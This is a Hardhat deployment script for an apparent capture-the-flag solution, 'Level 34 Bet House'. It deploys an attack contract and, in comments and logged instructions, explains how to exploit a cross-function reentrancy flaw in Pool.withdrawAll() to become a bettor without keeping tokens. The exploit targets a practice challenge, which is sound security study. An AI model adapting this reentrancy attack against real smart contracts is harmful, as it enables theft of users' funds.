import { HardhatRuntimeEnvironment } from "hardhat/types";
import { DeployFunction } from "hardhat-deploy/types";

/**
 * Deployment script for Bet House Attack Solution
 *
 * This deploys the BetHouseAttack contract that exploits the
 * cross-function reentrancy vulnerability in Pool.withdrawAll()
 *
 * EXPLOIT MECHANISM:
 * 1. withdrawAll() sends ETH via .call() before burning wrapped tokens
 * 2. During the ETH callback, we still have our wrapped token balance
 * 3. We can re-deposit PDT, lock deposits, and call makeBet()
 * 4. After callback returns, tokens are burned but we're already a bettor!
 */

const func: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {
  const { deployments, getNamedAccounts, ethers } = hre;
  const { deploy } = deployments;
  const { deployer } = await getNamedAccounts();

  console.log("\n=== Deploying Bet House Attack Solution ===\n");
  console.log(`Deployer: ${deployer}`);

  // Get BetHouse address from environment or previous deployment
  let betHouseAddress = process.env.BET_HOUSE_ADDRESS;

  if (!betHouseAddress) {
    try {
      const betHouseDeployment = await deployments.get("BetHouse");
      betHouseAddress = betHouseDeployment.address;
      console.log(`Using BetHouse from deployment: ${betHouseAddress}`);
    } catch {
      console.log("\n⚠️  BetHouse address not found!");
      console.log("Set BET_HOUSE_ADDRESS environment variable or deploy BetHouse first.");
      console.log("Example: BET_HOUSE_ADDRESS=0x... npx hardhat deploy --tags BetHouseAttack\n");
      return;
    }
  } else {
    console.log(`Using BetHouse from env: ${betHouseAddress}`);
  }

  // Deploy attack contract
  console.log("\n1. Deploying BetHouseAttack...");
  const attack = await deploy("BetHouseAttack", {
    from: deployer,
    args: [betHouseAddress],
    log: true,
    waitConfirmations: 1,
  });
  console.log(`   BetHouseAttack deployed at: ${attack.address}`);

  // Get contract instances for info
  const betHouse = await ethers.getContractAt("BetHouse", betHouseAddress);
  const poolAddress = await betHouse.pool();
  const pool = await ethers.getContractAt("Pool", poolAddress);
  const pdtAddress = await pool.depositToken();

  console.log("\n=== Deployment Summary ===");
  console.log(`BetHouse: ${betHouseAddress}`);
  console.log(`Pool: ${poolAddress}`);
  console.log(`PDT: ${pdtAddress}`);
  console.log(`BetHouseAttack: ${attack.address}`);

  console.log("\n=== Attack Instructions ===");
  console.log("1. Transfer 5 PDT to the attack contract");
  console.log("2. Call attack() with 0.001 ETH");
  console.log("3. The attack will:");
  console.log("   a. Deposit PDT + ETH → get 15 wrapped tokens");
  console.log("   b. Call withdrawAll() → triggers ETH callback");
  console.log("   c. In callback: re-deposit PDT → 20 tokens, lock, makeBet()");
  console.log("   d. After callback: tokens burned but already a bettor!");

  console.log("\n=== Run Attack ===");
  console.log(`npx hardhat run scripts/level-34-bet-house/attack.ts --network ${hre.network.name}`);
  console.log("\nOr with environment variable:");
  console.log(`BET_HOUSE_ADDRESS=${betHouseAddress} npx hardhat run scripts/level-34-bet-house/attack.ts --network ${hre.network.name}`);

  // Verify on Etherscan if not local
  if (hre.network.name !== "hardhat" && hre.network.name !== "localhost") {
    console.log("\n=== Verifying on Etherscan ===");
    try {
      await hre.run("verify:verify", {
        address: attack.address,
        constructorArguments: [betHouseAddress],
      });
    } catch (e) {
      console.log("Verification failed:", e);
    }
  }
};

export default func;
func.tags = ["BetHouseAttack", "Level34Solution"];
